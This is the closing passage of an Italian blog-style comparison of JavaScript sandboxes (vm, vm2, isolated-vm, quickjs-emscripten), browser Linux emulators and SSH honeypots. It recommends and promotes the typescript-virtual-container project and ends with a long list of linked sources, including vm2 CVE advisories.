| **Tempo avvio** | istantaneo | istantaneo | istantaneo | 15–40s | 15–40s | 2–5s | istantaneo | <1s |
| **RAM/istanza** | ~1 MB | ~3–10 MB | ~5–15 MB | 150–256 MB | 200+ MB | ~100 MB | ~50 MB | ~5–20 MB |
| **Dipendenze runtime** | 0 | 1 (nativa) | 1 (Wasm) | 0 | proprietario | 1 | dip. Python | 3 (ssh2, ws, fflate) |
| **Stato** | stabile | ✅ attivo | ✅ attivo | ✅ molto attivo | commerciale | ✅ attivo | ✅ attivo | ✅ attivo |

---

## Quando usare cosa

**Devi eseguire JavaScript non fidato -- una formula inviata dall'utente, un plugin, uno script hook.**  
→ `isolated-vm`. Vero V8 Isolate, limiti di memoria rigidi, ponte di comunicazione esplicito. Evita `vm2` -- la lista CVE continua a crescere, seriamente è come una nuova ogni pochi mesi. Evita `vm` -- non è affatto una sandbox, per favore.

**Devi fare sandboxing JS e non vuoi un addon nativo, o hai bisogno di compatibilità browser.**  
→ `quickjs-emscripten`. Confine Wasm, modulo ~500 KB, funziona in browser e Node. Più lento di V8 ma genuinamente isolato.

**Devi avviare un vero sistema operativo Linux non modificato con compatibilità binaria.**  
→ `v86` per Linux 32-bit, o `container2wasm` se hai un'immagine Docker esistente. Accetta 150 MB+ di RAM e un avvio di 30 secondi, è così e basta. Se hai bisogno di 64-bit, guarda CheerpX o usa un runtime container reale.

**Devi incorporare un terminale simile a Linux in un'app web senza backend.**  
→ `v86` (OS completo, pesante, lento da avviare) o il bundle browser di `typescript-virtual-container` (simulatore, più leggero, avvio istantaneo, include `startxfce4` per un desktop completo che è piuttosto figo, ngl).

**Hai bisogno di tutorial di programmazione interattivi online o un IDE nel browser.**  
→ WebContainers se sei focalizzato sull'ecosistema Node.js. CheerpX se hai bisogno di un vero userland Linux. Il bundle browser di `typescript-virtual-container` se vuoi un'opzione più leggera con un'API tipizzata.

**Vuoi raccogliere TTP degli attaccanti SSH su larga scala.**  
→ Cowrie è lo standard di produzione, punto. Funziona su qualsiasi server Linux, si integra con ogni SIEM, ora ha la modalità LLM. Usa Cowrie e basta.

**Vuoi dati honeypot SSH in un'applicazione Node.js con un'API programmatica.**  
→ `typescript-virtual-container`. I comandi vengono effettivamente eseguiti. Il VFS è una vera struttura dati che puoi snapshotare e confrontare. L'attaccante ottiene un ambiente interattivo convincente, e tu ottieni dati di audit strutturati senza lasciare Node.

**Hai bisogno di automazione/test di shell in CI senza Docker.**  
→ `typescript-virtual-container`. Si avvia in meno di un secondo, snapshot prima di un test, ripristina dopo. Esegui comandi shell con un'API tipizzata. Nessun demone Docker, nessun kernel, nessuna VM, nessuna attesa.

**Hai bisogno di ambienti shell multi-tenant (SaaS, istruzione, formazione).**  
→ `typescript-virtual-container`. 5–20 MB per istanza contro 150–256 MB per un emulatore. 100 utenti concorrenti: ~2 GB contro ~25 GB. È una grande differenza nei costi di hosting!

**Hai bisogno di un honeypot realistico che ti permetta anche di costruire un laboratorio di rete multi-VM.**  
→ `typescript-virtual-container` è l'unica cosa in questo spazio che fa entrambe le cose.

---

## Cosa non può fare (e voglio essere onesto su questo)

Non può eseguire binari x86 nativi. Se hai bisogno di compilare codice C, eseguire un vero interprete Python o usare software compilato per Linux, non c'è un ABI del kernel per supportare quelle syscall. Comandi come `gcc`, `python3` e `node` sono stub -- rispondono a `--version` e invocazioni comuni, ma non eseguono nulla di reale.

Questo è il compromesso fondamentale: guadagni 10–50x meno memoria, avvio istantaneo, compatibilità browser, un'API tipizzata, vero SSH e rete virtuale -- e rinunci alla compatibilità binaria con l'userland Linux.

Fortune ci ha pensato molto quando ha progettato il progetto. Per i casi d'uso a cui mirava -- honeypot, test, terminali incorporati, ambienti CI -- eseguire un binario compilato non è mai realmente necessario. Pipeline di shell, manipolazione di file, routing di rete e SSH coprono tutto. Ma se il tuo caso d'uso richiede vero software compilato, `v86` o Docker sono la risposta giusta, non questo.

---

## Per concludere

Quindi sì. Questo ecosistema è più ampio e frammentato di quanto sembri dall'esterno. `vm` è un separatore di scope, non una sandbox. `vm2` continua ad accumulare CVE (davvero, controlla gli advisory di questo mese). `isolated-vm` è la risposta corretta per il sandboxing JS ma solo JS. `quickjs-emscripten` è la scelta giusta quando hai bisogno di compatibilità browser o vuoi evitare addon nativi. `v86` e CheerpX sono veri emulatori quando hai bisogno di vera compatibilità binaria. WebContainers è Node.js in Wasm, non un ambiente Linux generico. Cowrie è lo standard aureo per honeypot SSH, ma è Python e non Node-nativo.

E poi c'è `typescript-virtual-container` -- il progetto di Fortune -- che vive un po' in una categoria propria. Non un emulatore, non una sandbox JS, non un honeypot passivo. Qualcosa di mezzo tra tutti loro che si è rivelato sorprendentemente utile per molte cose che nessuno degli altri può fare.

`typescript-virtual-container` colma il divario che nessun altro tocca: un ambiente shell Linux completo e programmatico con vero SSH, SFTP, permessi POSIX, gestione utenti, rete virtuale e un'API TypeScript tipizzata -- che funziona in ~10 MB, si avvia in meno di un secondo, funziona sia in Node.js che nel browser.

Se vuoi provarlo: il sorgente è su [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container) e c'è una demo live (incluso `startxfce4` per un desktop completo, che è onestamente pazzesco) su [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo). Dai un'occhiata e lascia qualche stella a Fortune su GitHub, se lo merita!

Grazie per aver letto -- questo è stato lungo anche per i miei standard :) spero sia stato utile!

---

## Fonti

Ho cercato di collegare ogni affermazione a una fonte primaria -- advisory CVE, documentazione ufficiale, repository GitHub, post di blog dei maintainer. Un paio di note: la lista CVE di vm2 continua a crescere quindi il link FortiGuard potrebbe essere obsoleto quando lo leggerai (controlla la pagina degli advisory GitHub per gli ultimi). I link di Bellard sono tutti stabili -- il suo sito personale è attivo da sempre e il contenuto non cambia. E se vuoi approfondire uno qualsiasi dei polyfill, sfoglia direttamente la cartella `polyfills/` nel repository `typescript-virtual-container` -- è più leggibile di qualsiasi descrizione che potrei scrivere qui.

### Sandbox JavaScript

- **Modulo `vm` di Node.js** -- documentazione ufficiale: [nodejs.org/api/vm.html](https://nodejs.org/api/vm.html)
- **Avviso di sicurezza `vm` di Node.js** -- "The vm module is not a security mechanism. Do not use it to run untrusted code": [nodejs.org/api/vm.html#vm-executing-javascript](https://nodejs.org/api/vm.html)
- **`vm2`** -- npm: [npmjs.com/package/vm2](https://www.npmjs.com/package/vm2) · GitHub: [github.com/patriksimek/vm2](https://github.com/patriksimek/vm2)
- **Timeline CVE vm2** -- FortiGuard outbreak alert con lista CVE completa e date: [fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape](https://fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape)
- **CVE-2023-29017** -- fuga stack error async, GHSA: [github.com/advisories/GHSA-7jxr-cg7f-gpgv](https://github.com/advisories/GHSA-7jxr-cg7f-gpgv)
- **CVE-2023-32314** -- Proxy + Error.name + Function escape, gist PoC: [gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac](https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac)
- **CVE-2023-37466** -- Exploit DB entry con PoC completo: [exploit-db.com/exploits/51898](https://www.exploit-db.com/exploits/51898)
- **CVE vm2 2026** -- 11 nuove sandbox escape, analisi: [thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956](https://thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956) · BleepingComputer: [bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library](https://www.bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library/)
- **"Why Sandboxing JS in JS is Hard"** -- post-mortem di oxeye.io su CVE-2022-36067: [oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067](https://www.oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067)
- **`isolated-vm`** -- npm: [npmjs.com/package/isolated-vm](https://www.npmjs.com/package/isolated-vm) · GitHub: [github.com/laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)
- **Interni V8 Isolate** -- guida all'embedding: [v8.dev/docs/embed](https://v8.dev/docs/embed)
- **`quickjs-emscripten`** -- npm: [npmjs.com/package/quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten) · GitHub: [github.com/justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)
- **`@sebastianwessel/quickjs`** -- npm: [npmjs.com/package/@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs) · GitHub: [github.com/sebastianwessel/quickjs](https://github.com/sebastianwessel/quickjs)
- **Motore QuickJS** -- di Fabrice Bellard: [bellard.org/quickjs](https://bellard.org/quickjs/)
- **Modello di permessi Deno** -- documentazione: [docs.deno.com/runtime/fundamentals/security](https://docs.deno.com/runtime/fundamentals/security/)
- **Rilascio Deno 2** -- ottobre 2024: [deno.com/blog/v2](https://deno.com/blog/v2)
- **Proposta TC39 ShadowRealm** -- [github.com/tc39/proposal-shadowrealm](https://github.com/tc39/proposal-shadowrealm)
- **Proposta TC39 Compartments** -- [github.com/nicolo-ribaudo/tc39-proposal-compartments](https://github.com/nicolo-ribaudo/tc39-proposal-compartments)
- **"Sandboxing JavaScript Code"** -- articolo pratico di Andrew Healey sull'approccio sandbox di Deno: [healeycodes.com/sandboxing-javascript-code](https://healeycodes.com/sandboxing-javascript-code)

### Emulatori Linux

- **`v86`** -- npm: [npmjs.com/package/v86](https://www.npmjs.com/package/v86) · GitHub: [github.com/copy/v86](https://github.com/copy/v86) · Demo: [copy.sh/v86](https://copy.sh/v86)
- **Matrice supporto OS v86** -- [github.com/copy/v86#operating-system-support](https://github.com/copy/v86)
- **SeaBIOS** (BIOS usato da v86) -- [seabios.org](https://www.seabios.org/SeaBIOS)
- **Estensioni Bochs VBE** (riferimento VGA) -- [bochs.sourceforge.io](https://bochs.sourceforge.io/)
- **JSLinux** -- Emulatore di Bellard: [bellard.org/jslinux](https://bellard.org/jslinux/) · Note tecniche (TinyEMU, storia, asm.js→Wasm): [bellard.org/jslinux/tech.html](https://bellard.org/jslinux/tech.html)
- **TinyEMU** -- Sorgente C: [bellard.org/tinyemu](https://bellard.org/tinyemu/) · Mirror GitHub non ufficiali: [github.com/yoshijava/TinyEMU](https://github.com/yoshijava/TinyEMU)
- **jor1k** -- Emulatore JS OpenRISC: [github.com/s-macke/jor1k](https://github.com/s-macke/jor1k) · Demo: [s-macke.github.io/jor1k/demos/main.html](https://s-macke.github.io/jor1k/demos/main.html)
- **CheerpX** -- Documentazione: [cheerpx.io/docs/overview](https://cheerpx.io/docs/overview) · Guida pthreads: [cheerpx.io/docs/guides/pthreads](https://cheerpx.io/docs/guides/pthreads)
- **WebContainers** -- npm: [npmjs.com/package/@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api) · Documentazione API: [webcontainers.io](https://webcontainers.io) · Annuncio: [blog.stackblitz.com/posts/webcontainer-api-is-here](https://blog.stackblitz.com/posts/webcontainer-api-is-here/) · Panoramica InfoQ: [infoq.com/news/2021/07/webcontainers-nodejs](https://www.infoq.com/news/2021/07/webcontainers-nodejs/)
- **container2wasm** -- GitHub: [github.com/container2wasm/container2wasm](https://github.com/container2wasm/container2wasm) · Post blog NTT: [medium.com/nttlabs/container2wasm-2dd90a18cc9a](https://medium.com/nttlabs/container2wasm-2dd90a18cc9a) · Articolo di Simon Willison: [simonwillison.net/2024/Jan/3/container2wasm](https://simonwillison.net/2024/Jan/3/container2wasm/)

### Stack terminale

- **xterm.js** -- npm: [npmjs.com/package/@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm) · GitHub: [github.com/xtermjs/xterm.js](https://github.com/xtermjs/xterm.js) · sito: [xtermjs.org](https://xtermjs.org)
- **node-pty** -- npm: [npmjs.com/package/node-pty](https://www.npmjs.com/package/node-pty) · GitHub (Microsoft): [github.com/microsoft/node-pty](https://github.com/microsoft/node-pty)

### Honeypot

- **Cowrie** -- GitHub: [github.com/cowrie/cowrie](https://github.com/cowrie/cowrie) · Documentazione: [docs.cowrie.org](https://docs.cowrie.org) · Sito: [cowrie.org](https://www.cowrie.org/)
- **Kippo** -- GitHub (archiviato): [github.com/desaster/kippo](https://github.com/desaster/kippo)
- **endlessh** -- GitHub: [github.com/skeeto/endlessh](https://github.com/skeeto/endlessh)
- **sshesame** -- GitHub: [github.com/jaksi/sshesame](https://github.com/jaksi/sshesame)
- **Lyrebird** -- Docker Hub: [hub.docker.com/r/lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)
- **node-simple-ssh-honeypot** -- Honeypot SSH Node.js minimale: [github.com/Caesarovich/node-simple-ssh-honeypot](https://github.com/Caesarovich/node-simple-ssh-honeypot)
- **awesome-honeypots** -- Lista curata: [github.com/paralax/awesome-honeypots](https://github.com/paralax/awesome-honeypots)
- **MITRE ATT&CK T1082** -- System Information Discovery (come gli attaccanti fingerprintano gli honeypot): [attack.mitre.org/techniques/T1082](https://attack.mitre.org/techniques/T1082/)

### `typescript-virtual-container`

- **npm**: [npmjs.com/package/typescript-virtual-container](https://www.npmjs.com/package/typescript-virtual-container)
- **GitHub**: [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container)
- **Demo live**: [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo)
- **Guida all'architettura**: [github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md](https://github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md)
- **`ssh2`** (implementazione protocollo SSH) -- npm: [npmjs.com/package/ssh2](https://www.npmjs.com/package/ssh2) · GitHub: [github.com/mscdex/ssh2](https://github.com/mscdex/ssh2)
- **`fflate`** (compressione snapshot VFS) -- npm: [npmjs.com/package/fflate](https://www.npmjs.com/package/fflate)
- **`ws`** (trasporto shell WebSocket) -- npm: [npmjs.com/package/ws](https://www.npmjs.com/package/ws)

### Letture di approfondimento

- **Modello di permessi POSIX** -- Specifica Open Group: [pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html](https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html)
- **Write-ahead logging** (pattern usato nella persistenza VFS) -- [en.wikipedia.org/wiki/Write-ahead_logging](https://en.wikipedia.org/wiki/Write-ahead_logging)
- **Modello V8 Isolate** -- "Embedder's Guide": [v8.dev/docs/embed](https://v8.dev/docs/embed)
- **Specifica ISA RISC-V** (per contesto TinyEMU/JSLinux) -- [riscv.org/technical/specifications](https://riscv.org/technical/specifications/)
- **Architettura OpenRISC 1000** -- [opencores.org/or1k](https://opencores.org/or1k/)
- **"Running Python code in a Pyodide sandbox via Deno"** -- Simon Willison TIL, utile contrasto con l'approccio Wasm: [til.simonwillison.net](https://til.simonwillison.net/deno/pyodide-sandbox)
- **"Running self-hosted QuickJS in a browser"** -- Simon Willison TIL sulla dimensione del bundle quickjs-emscripten: [til.simonwillison.net/npm/self-hosted-quickjs](https://til.simonwillison.net/npm/self-hosted-quickjs)
